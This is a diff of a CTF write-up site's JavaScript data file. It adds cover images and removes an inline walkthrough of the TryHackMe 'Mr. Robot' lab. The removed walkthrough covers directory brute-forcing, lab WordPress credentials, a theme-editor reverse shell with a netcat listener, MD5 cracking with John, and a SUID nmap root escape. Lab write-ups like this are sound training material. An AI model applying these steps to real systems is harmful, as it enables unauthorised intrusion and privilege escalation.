@@ -7,6 +7,7 @@
 const WRITEUPS = [
   {
     slug: "blue",
+    cover: "static/assets/covers/blue.jpg",
     title: "Blue",
     platform: "thm",
     difficulty: "easy",
@@ -17,6 +18,7 @@ const WRITEUPS = [
   },
   {
     slug: "kenobi",
+    cover: "static/assets/covers/kenobi.jpg",
     title: "Kenobi",
     platform: "thm",
     difficulty: "easy",
@@ -27,6 +29,7 @@ const WRITEUPS = [
   },
   {
     slug: "mr-robot",
+    cover: "static/assets/covers/mr-robot.jpg",
     title: "Mr. Robot",
     platform: "thm",
     difficulty: "medium",
@@ -35,79 +38,11 @@ const WRITEUPS = [
     room: "https://tryhackme.com/room/mrrobot",
     desc: "WordPress theme-editor reverse shell, an MD5 hash crack, and a SUID nmap privesc to root.",
     tags: ["wordpress", "john", "suid", "nmap"],
-    url: "#",
-    content: [
-      { type: "h2", icon: "&#128075;", text: "Introduction" },
-      { type: "p", text: "Hello everyone! Sh4d0wSpl01t here. Today we’re going to dive deep into <strong>Mr. Robot</strong>, a medium-level machine on TryHackMe inspired by the hit TV series. This room covers web enumeration, WordPress exploitation, password cracking, and privilege escalation via SUID binaries." },
-      { type: "list", items: [
-        "Hidden directories and information disclosure via /robots.txt",
-        "WordPress credential brute-forcing with a custom dictionary",
-        "Reverse shell delivery through theme injection",
-        "SUID binary abuse for root privilege escalation"
-      ]},
-      { type: "p", text: "Let’s hack our way into the system — just like our favorite hacker, Elliot Alderson." },
-
-      { type: "h2", icon: "&#128269;", text: "Phase 1: Reconnaissance" },
-      { type: "p", text: "As with any pentest, we start with enumeration. Our weapon of choice: nmap." },
-      { type: "code", lang: "bash", code: "nmap -sC -sV -oN nmap-initial.txt 10.10.x.x" },
-      { type: "image", src: "static/assets/mr-robot/nmap-scan.png", alt: "nmap scan", caption: "nmap scan on the target IP" },
-      { type: "p", text: "Scan Results:" },
-      { type: "image", src: "static/assets/mr-robot/nmap-scan-results.png", alt: "nmap scan results", caption: "nmap scan results against the target IP" },
-
-      { type: "h2", icon: "&#128193;", text: "Phase 2: Web Enumeration \u2014 the robots.txt discovery" },
-      { type: "p", text: "The landing page looks stylish, but the real treasure is in hidden directories. Time to brute-force them." },
-      { type: "code", lang: "bash", code: "ffuf -u http://10.10.x.x/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" },
-      { type: "image", src: "static/assets/mr-robot/ffuf-results.png", alt: "ffuf scan results", caption: "ffuf directory brute-force results" },
-      { type: "p", text: "The <code>robots</code> path stands out. Navigating to <code>/robots</code> turns up two immediate findings: a flag file and a wordlist." },
-
-      { type: "h2", icon: "&#128273;", text: "First Flag \u2014 Key 1 of 3" },
-      { type: "code", lang: "bash", code: "curl http://10.10.x.x/key-1-of-3.txt" },
-      { type: "image", src: "static/assets/mr-robot/flag1-curl.png", alt: "curl output for flag 1", caption: "Extracting key-1-of-3.txt with curl" },
-
-      { type: "h2", icon: "&#128218;", text: "The Dictionary File" },
-      { type: "p", text: "We also grab the wordlist <code>fsocity.dic</code> — it comes in handy later for cracking a password hash." },
-      { type: "code", lang: "bash", code: "curl -O http://10.10.x.x/fsocity.dic\nsort fsocity.dic | uniq > fsocity-clean.dic" },
-      { type: "p", text: "Digging through the <code>license</code> directory turns up a base64 blob buried further down the page." },
-      { type: "code", lang: "bash", code: "echo '<base64 string>' | base64 -d" },
-      { type: "image", src: "static/assets/mr-robot/base64-decode.png", alt: "decoding the base64 string", caption: "Decoding the embedded base64 string reveals WordPress credentials" },
-
-      { type: "h2", icon: "&#128274;", text: "Phase 3: WordPress Discovery & Brute Force" },
-      { type: "p", text: "The presence of <code>/wp-login</code> confirms a WordPress install. We already have a decoded credential to try." },
-      { type: "image", src: "static/assets/mr-robot/wp-login.png", alt: "WordPress login page", caption: "The WordPress login page at /wp-login" },
-
-      { type: "h2", icon: "&#128137;", text: "Phase 4: Gaining Foothold \u2014 WordPress to Reverse Shell" },
-      { type: "p", text: "Logging in with <code>elliot</code> / <code>ER28-0652</code> gets us into the WordPress admin panel." },
-      { type: "list", items: [
-        "Navigate to Appearance &rarr; Theme Editor",
-        "Select the 404.php template — often overlooked, perfect for a payload",
-        "Replace the contents with a PHP reverse shell and click Update File"
-      ]},
-      { type: "code", lang: "bash", code: "# on the attacking machine\nnc -lvnp 1234" },
-      { type: "code", lang: "bash", code: "# trigger the shell by requesting a page that 404s\ncurl http://10.10.x.x/?404.php" },
-      { type: "image", src: "static/assets/mr-robot/reverse-shell.png", alt: "reverse shell caught on netcat listener", caption: "Shell caught as the daemon user" },
-      { type: "p", text: "Stabilize the shell once it lands:" },
-      { type: "code", lang: "bash", code: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nexport SHELL=/bin/bash\n# Ctrl+Z, then:\nstty raw -echo; fg" },
-
-      { type: "h2", icon: "&#128100;", text: "Phase 5: Privilege Escalation \u2014 From Daemon to Robot" },
-      { type: "code", lang: "bash", code: "ls -la /home\ncd /home/robot\ncat password.raw-md5" },
-      { type: "p", text: "That's an MD5 hash — crack it with John the Ripper against rockyou:" },
-      { type: "code", lang: "bash", code: "echo \"c3fcd3d76192e4007dfb496cca67e13b\" > hash.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
-      { type: "image", src: "static/assets/mr-robot/john-crack.png", alt: "John the Ripper cracking the hash", caption: "John cracks the robot user's MD5 hash" },
-      { type: "code", lang: "bash", code: "su robot\ncat /home/robot/key-2-of-3.txt" },
-
-      { type: "h2", icon: "&#128081;", text: "Phase 6: Privilege Escalation \u2014 From Robot to Root" },
-      { type: "p", text: "Time to hunt for SUID binaries — files that execute with the owner's privileges." },
-      { type: "code", lang: "bash", code: "find / -type f -perm -04000 2>/dev/null" },
-      { type: "image", src: "static/assets/mr-robot/suid-find.png", alt: "SUID binaries found on the system", caption: "nmap turns up as an unexpected SUID binary" },
-      { type: "p", text: "nmap's interactive mode allows shelling out — and since it runs as root, that gives us a root shell." },
-      { type: "code", lang: "bash", code: "nmap --interactive\n!sh" },
-      { type: "code", lang: "bash", code: "cd /root\nls\ncat key-3-of-3.txt" },
-      { type: "p", text: "All three keys captured — box rooted." },
-      { type: "video", src: "static/assets/mr-robot/root-privesc.mp4", caption: "Full nmap SUID privesc to root, captured live" }
-    ]
+    url: "mr-robot.html"
   },
   {
     slug: "wonderland",
+    cover: "static/assets/covers/wonderland.jpg",
     title: "Wonderland",
     platform: "thm",
     difficulty: "medium",
@@ -118,6 +53,7 @@ const WRITEUPS = [
   },
   {
     slug: "dc-9",
+    cover: "static/assets/covers/dc-9.jpg",
     title: "DC-9",
     platform: "vh",
     difficulty: "medium",
@@ -128,6 +64,7 @@ const WRITEUPS = [
   },
   {
     slug: "wreath-network",
+    cover: "static/assets/covers/wreath-network.jpg",
     title: "Wreath Network",
     platform: "thm",
     difficulty: "hard",
@@ -138,6 +75,7 @@ const WRITEUPS = [
   },
   {
     slug: "sar",
+    cover: "static/assets/covers/sar.jpg",
     title: "Sar",
     platform: "vh",
     difficulty: "easy",
@@ -148,6 +86,7 @@ const WRITEUPS = [
   },
   {
     slug: "wonderland2",
+    cover: "static/assets/covers/wonderland2.jpg",
     title: "Wonderland2",
     platform: "vh",
     difficulty: "insane",
@@ -215,9 +154,15 @@ function renderCards(list){
         <span class="platform-tag"><span class="platform-dot ${w.platform}"></span>${platformLabel[w.platform]}</span>
         <span class="difficulty ${w.difficulty}">${w.difficulty}</span>
       </div>
+      <div class="card-cover-wrap">
+        <img class="card-cover" src="${w.cover}" alt="${w.title} cover" onerror="this.closest('.card-cover-wrap').classList.add('missing')">
+        <div class="card-cover-fallback">
+          <strong>No cover image</strong>
+          <small>expected at: ${w.cover}</small>
+        </div>
+      </div>
       <div class="card-body">
         <h3 class="card-title">${w.title}</h3>
-        <p class="card-desc">${w.desc}</p>
         <div class="tags">${w.tags.map(t => `<span class="tag">#${t}</span>`).join("")}</div>
         <div class="card-meta" style="margin-top:12px;"><span>${w.date}</span></div>
         <div class="card-cta">cat writeup.md <span class="arrow">&rarr;</span></div>
